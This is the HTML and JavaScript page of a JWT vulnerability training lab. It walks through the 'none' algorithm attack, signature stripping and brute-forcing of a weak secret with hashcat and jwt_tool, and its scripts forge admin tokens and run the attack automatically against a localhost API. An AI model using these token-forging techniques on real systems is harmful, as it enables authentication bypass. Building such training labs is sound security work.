<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>JWT Vulnerability Lab</title>
    <link rel="stylesheet" href="styles.css">
    <style>
        .jwt-container {
            max-width: 900px;
            margin: 20px auto;
        }
        
        .jwt-section {
            background: white;
            padding: 25px;
            margin-bottom: 20px;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        
        .token-display {
            background: #f8f9fa;
            padding: 15px;
            border-radius: 5px;
            word-wrap: break-word;
            font-family: 'Courier New', monospace;
            font-size: 12px;
            border-left: 4px solid #667eea;
            margin: 10px 0;
        }
        
        .token-parts {
            margin-top: 15px;
        }
        
        .token-part {
            margin-bottom: 15px;
            padding: 10px;
            border-radius: 5px;
        }
        
        .header-part {
            background: #ffe6e6;
            border-left: 4px solid #ff4444;
        }
        
        .payload-part {
            background: #e6f3ff;
            border-left: 4px solid #4444ff;
        }
        
        .signature-part {
            background: #e6ffe6;
            border-left: 4px solid #44ff44;
        }
        
        .json-display {
            background: #2d2d2d;
            color: #f8f8f2;
            padding: 15px;
            border-radius: 5px;
            overflow-x: auto;
            font-family: 'Courier New', monospace;
            font-size: 13px;
        }
        
        textarea {
            width: 100%;
            min-height: 100px;
            padding: 10px;
            border: 2px solid #ddd;
            border-radius: 5px;
            font-family: 'Courier New', monospace;
            font-size: 12px;
            resize: vertical;
        }
        
        .response-box {
            margin-top: 15px;
            padding: 15px;
            border-radius: 5px;
            display: none;
        }
        
        .response-box.success {
            background: #d4edda;
            border: 2px solid #28a745;
            color: #155724;
            display: block;
        }
        
        .response-box.error {
            background: #f8d7da;
            border: 2px solid #dc3545;
            color: #721c24;
            display: block;
        }
        
        .btn-group {
            display: flex;
            gap: 10px;
            margin-top: 15px;
        }
        
        .btn-small {
            padding: 8px 16px;
            font-size: 14px;
            width: auto;
        }
        
        .exploit-examples {
            background: #fff3cd;
            padding: 15px;
            border-radius: 5px;
            border-left: 4px solid #ffc107;
            margin-top: 15px;
        }
        
        .code-block {
            background: #2d2d2d;
            color: #f8f8f2;
            padding: 10px;
            border-radius: 5px;
            margin: 10px 0;
            overflow-x: auto;
            font-family: 'Courier New', monospace;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <div class="jwt-container">
        <div class="jwt-section">
            <h1>🔓 JWT Vulnerability Lab</h1>
            <div class="warning">
                ⚠️ <strong>Training Environment Only</strong><br>
                This lab demonstrates critical JWT vulnerabilities for educational purposes.
            </div>
            
            <div style="text-align: center; margin: 20px 0;">
                <a href="index.php" class="btn btn-secondary btn-small">← Back to Login Lab</a>
            </div>
        </div>

        <!-- Token Generator -->
        <div class="jwt-section">
            <h2>🎫 Step 1: Generate JWT Token</h2>
            <p>Generate a JWT token for any username (no authentication required)</p>
            
            <div class="form-group">
                <label for="username">Username:</label>
                <input type="text" id="username" value="testuser" placeholder="Enter username">
            </div>
            
            <button onclick="generateToken()" class="btn">Generate Token</button>
            
            <div id="generatedToken" class="response-box"></div>
        </div>

        <!-- Token Decoder -->
        <div class="jwt-section">
            <h2>🔍 Step 2: Decode & Modify Token</h2>
            <p>Paste a JWT token to decode and view its contents</p>
            
            <div class="form-group">
                <label for="tokenInput">JWT Token:</label>
                <textarea id="tokenInput" placeholder="Paste JWT token here..."></textarea>
            </div>
            
            <div class="btn-group">
                <button onclick="decodeToken()" class="btn btn-small">Decode Token</button>
                <button onclick="createNoneToken()" class="btn btn-small">Create "none" Algorithm Token</button>
                <button onclick="modifyToAdmin()" class="btn btn-small">Modify to Admin</button>
            </div>
            
            <div id="decodedToken" class="response-box"></div>
        </div>

        <!-- Token Verifier -->
        <div class="jwt-section">
            <h2>✅ Step 3: Verify Token & Access Protected Data</h2>
            <p>Verify your token and try to access admin-only data</p>
            
            <div class="form-group">
                <label for="verifyTokenInput">JWT Token to Verify:</label>
                <textarea id="verifyTokenInput" placeholder="Paste modified JWT token here..."></textarea>
            </div>
            
            <div class="btn-group">
                <button onclick="verifyToken()" class="btn btn-small">Verify Token</button>
                <button onclick="getAdminData()" class="btn btn-small">🔐 Get Admin Data</button>
            </div>
            
            <div id="verifyResult" class="response-box"></div>
        </div>

        <!-- Exploitation Guide -->
        <div class="jwt-section">
            <h2>🎯 Exploitation Techniques</h2>
            
            <details open>
                <summary><strong>1️⃣ None Algorithm Attack</strong></summary>
                <div class="exploit-examples">
                    <p>Change the algorithm to "none" and remove the signature:</p>
                    <div class="code-block">
// Original Header
{"typ":"JWT","alg":"HS256"}

// Modified Header
{"typ":"JWT","alg":"none"}

// Modified Payload (change role to admin)
{"user":"testuser","role":"admin","exp":...,"iat":...}

// New Token Format:
base64(header).base64(payload).
// Note: Empty signature or just a dot at the end
                    </div>
                    <button onclick="demonstrateNoneAttack()" class="btn btn-small">Auto-Exploit None Attack</button>
                </div>
            </details>

            <details>
                <summary><strong>2️⃣ Signature Stripping</strong></summary>
                <div class="exploit-examples">
                    <p>Modify the payload and remove the signature entirely:</p>
                    <div class="code-block">
// Steps:
1. Decode the JWT
2. Modify role: "user" → "admin"
3. Re-encode header and payload
4. Remove signature or use empty signature
                    </div>
                </div>
            </details>

            <details>
                <summary><strong>3️⃣ Weak Secret Brute Force</strong></summary>
                <div class="exploit-examples">
                    <p>The secret is weak: <code>secret123</code></p>
                    <p>You can brute force it using tools like:</p>
                    <div class="code-block">
# Using hashcat
hashcat -a 0 -m 16500 jwt.txt wordlist.txt

# Using jwt_tool
python3 jwt_tool.py [TOKEN] -C -d wordlist.txt

# The secret: secret123
                    </div>
                </div>
            </details>

            <details>
                <summary><strong>4️⃣ Using curl commands</strong></summary>
                <div class="exploit-examples">
                    <div class="code-block">
# Generate token
curl "http://localhost:8080/api.php?action=generate&user=hacker"

# Verify token
curl "http://localhost:8080/api.php?action=verify&token=YOUR_TOKEN"

# Get admin data
curl "http://localhost:8080/api.php?action=admin-data&token=YOUR_ADMIN_TOKEN"
                    </div>
                </div>
            </details>
        </div>

        <!-- API Info -->
        <div class="jwt-section">
            <h2>📚 API Endpoints</h2>
            <ul>
                <li><code>GET /api.php?action=generate&user=USERNAME</code> - Generate JWT</li>
                <li><code>GET /api.php?action=verify&token=TOKEN</code> - Verify JWT</li>
                <li><code>GET /api.php?action=admin-data&token=TOKEN</code> - Get admin data (requires admin role)</li>
                <li><code>GET /api.php?action=info</code> - API information</li>
            </ul>
        </div>
    </div>

    <script>
        // Base64 URL encoding/decoding functions
        function base64UrlEncode(str) {
            return btoa(str)
                .replace(/\+/g, '-')
                .replace(/\//g, '_')
                .replace(/=/g, '');
        }

        function base64UrlDecode(str) {
            str = str.replace(/-/g, '+').replace(/_/g, '/');
            while (str.length % 4) {
                str += '=';
            }
            return atob(str);
        }

        async function generateToken() {
            const username = document.getElementById('username').value;
            const response = await fetch(`api.php?action=generate&user=${encodeURIComponent(username)}`);
            const data = await response.json();
            
            const resultDiv = document.getElementById('generatedToken');
            resultDiv.className = 'response-box success';
            resultDiv.innerHTML = `
                <h3>✅ Token Generated</h3>
                <p><strong>Username:</strong> ${data.payload.user}</p>
                <p><strong>Role:</strong> ${data.payload.role}</p>
                <div class="token-display">${data.token}</div>
                <button onclick="copyToClipboard('${data.token}')" class="btn btn-small">📋 Copy Token</button>
                <p style="margin-top: 10px;"><em>${data.hint}</em></p>
            `;
            
            document.getElementById('tokenInput').value = data.token;
        }

        function decodeToken() {
            const token = document.getElementById('tokenInput').value.trim();
            
            if (!token) {
                alert('Please enter a JWT token');
                return;
            }
            
            try {
                const parts = token.split('.');
                if (parts.length !== 3) {
                    throw new Error('Invalid JWT format');
                }
                
                const header = JSON.parse(base64UrlDecode(parts[0]));
                const payload = JSON.parse(base64UrlDecode(parts[1]));
                
                const resultDiv = document.getElementById('decodedToken');
                resultDiv.className = 'response-box success';
                resultDiv.innerHTML = `
                    <h3>🔍 Decoded Token</h3>
                    <div class="token-parts">
                        <div class="token-part header-part">
                            <strong>Header:</strong>
                            <pre class="json-display">${JSON.stringify(header, null, 2)}</pre>
                        </div>
                        <div class="token-part payload-part">
                            <strong>Payload:</strong>
                            <pre class="json-display">${JSON.stringify(payload, null, 2)}</pre>
                        </div>
                        <div class="token-part signature-part">
                            <strong>Signature:</strong>
                            <div class="token-display">${parts[2]}</div>
                        </div>
                    </div>
                `;
            } catch (error) {
                const resultDiv = document.getElementById('decodedToken');
                resultDiv.className = 'response-box error';
                resultDiv.innerHTML = `<strong>Error:</strong> ${error.message}`;
            }
        }

        function createNoneToken() {
            const token = document.getElementById('tokenInput').value.trim();
            
            if (!token) {
                alert('Please enter a JWT token first');
                return;
            }
            
            try {
                const parts = token.split('.');
                const payload = JSON.parse(base64UrlDecode(parts[1]));
                
                // Modify to admin
                payload.role = 'admin';
                
                const noneHeader = { typ: 'JWT', alg: 'none' };
                const newToken = base64UrlEncode(JSON.stringify(noneHeader)) + '.' + 
                                base64UrlEncode(JSON.stringify(payload)) + '.';
                
                document.getElementById('verifyTokenInput').value = newToken;
                
                const resultDiv = document.getElementById('decodedToken');
                resultDiv.className = 'response-box success';
                resultDiv.innerHTML = `
                    <h3>🎉 "None" Algorithm Token Created!</h3>
                    <p>Algorithm changed to "none" and role changed to "admin"</p>
                    <div class="token-display">${newToken}</div>
                    <p style="margin-top: 10px;">Token copied to verification box. Click "Verify Token" to test!</p>
                `;
            } catch (error) {
                alert('Error: ' + error.message);
            }
        }

        function modifyToAdmin() {
            const token = document.getElementById('tokenInput').value.trim();
            
            if (!token) {
                alert('Please enter a JWT token first');
                return;
            }
            
            try {
                const parts = token.split('.');
                const header = JSON.parse(base64UrlDecode(parts[0]));
                const payload = JSON.parse(base64UrlDecode(parts[1]));
                
                // Modify to admin
                payload.role = 'admin';
                
                // Create new token without proper signature
                const newToken = base64UrlEncode(JSON.stringify(header)) + '.' + 
                                base64UrlEncode(JSON.stringify(payload)) + '.' +
                                'INVALID_SIGNATURE';
                
                document.getElementById('verifyTokenInput').value = newToken;
                
                const resultDiv = document.getElementById('decodedToken');
                resultDiv.className = 'response-box success';
                resultDiv.innerHTML = `
                    <h3>✏️ Token Modified to Admin!</h3>
                    <p>Role changed to "admin" (signature is invalid but will be accepted)</p>
                    <div class="token-display">${newToken}</div>
                    <p style="margin-top: 10px;">Token copied to verification box. Click "Verify Token" to test!</p>
                `;
            } catch (error) {
                alert('Error: ' + error.message);
            }
        }

        async function verifyToken() {
            const token = document.getElementById('verifyTokenInput').value.trim();
            
            if (!token) {
                alert('Please enter a JWT token to verify');
                return;
            }
            
            const response = await fetch(`api.php?action=verify&token=${encodeURIComponent(token)}`);
            const data = await response.json();
            
            const resultDiv = document.getElementById('verifyResult');
            
            if (data.success) {
                resultDiv.className = 'response-box success';
                resultDiv.innerHTML = `
                    <h3>${data.message}</h3>
                    <p><strong>User:</strong> ${data.payload.user}</p>
                    <p><strong>Role:</strong> ${data.payload.role}</p>
                    <p><strong>Admin Access:</strong> ${data.is_admin ? '✅ YES' : '❌ NO'}</p>
                    ${data.secret_data ? `<p><strong>🎯 Flag:</strong> <code>${data.secret_data}</code></p>` : ''}
                    ${data.is_admin ? '<p style="margin-top: 10px;">Now click "Get Admin Data" to retrieve sensitive information!</p>' : ''}
                `;
            } else {
                resultDiv.className = 'response-box error';
                resultDiv.innerHTML = `<strong>Error:</strong> ${data.error}`;
            }
        }

        async function getAdminData() {
            const token = document.getElementById('verifyTokenInput').value.trim();
            
            if (!token) {
                alert('Please enter a JWT token');
                return;
            }
            
            const response = await fetch(`api.php?action=admin-data&token=${encodeURIComponent(token)}`);
            const data = await response.json();
            
            const resultDiv = document.getElementById('verifyResult');
            
            if (data.success) {
                resultDiv.className = 'response-box success';
                resultDiv.innerHTML = `
                    <h3>🎉 Admin Data Retrieved!</h3>
                    <pre class="json-display">${JSON.stringify(data.admin_data, null, 2)}</pre>
                    <p style="margin-top: 15px;"><strong>🏆 Congratulations!</strong> You've successfully exploited the JWT vulnerability!</p>
                `;
            } else {
                resultDiv.className = 'response-box error';
                resultDiv.innerHTML = `<strong>❌ Access Denied:</strong> ${data.error}`;
            }
        }

        async function demonstrateNoneAttack() {
            // Generate a token first
            const response = await fetch(`api.php?action=generate&user=attacker`);
            const data = await response.json();
            
            // Create none algorithm token
            const payload = data.payload;
            payload.role = 'admin';
            
            const noneHeader = { typ: 'JWT', alg: 'none' };
            const noneToken = base64UrlEncode(JSON.stringify(noneHeader)) + '.' + 
                            base64UrlEncode(JSON.stringify(payload)) + '.';
            
            document.getElementById('tokenInput').value = data.token;
            document.getElementById('verifyTokenInput').value = noneToken;
            
            // Verify the token
            const verifyResponse = await fetch(`api.php?action=verify&token=${encodeURIComponent(noneToken)}`);
            const verifyData = await verifyResponse.json();
            
            const resultDiv = document.getElementById('verifyResult');
            resultDiv.className = 'response-box success';
            resultDiv.innerHTML = `
                <h3>🎯 None Algorithm Attack Demonstrated!</h3>
                <p><strong>Original Token:</strong></p>
                <div class="token-display" style="font-size: 10px;">${data.token}</div>
                <p><strong>Modified Token (none algorithm):</strong></p>
                <div class="token-display" style="font-size: 10px;">${noneToken}</div>
                <p><strong>Result:</strong> ${verifyData.message}</p>
                <p><strong>Admin Access:</strong> ${verifyData.is_admin ? '✅ GRANTED' : '❌ DENIED'}</p>
                ${verifyData.secret_data ? `<p><strong>🎯 Flag:</strong> <code>${verifyData.secret_data}</code></p>` : ''}
            `;
        }

        function copyToClipboard(text) {
            navigator.clipboard.writeText(text).then(() => {
                alert('Token copied to clipboard!');
            });
        }
    </script>
</body>
</html>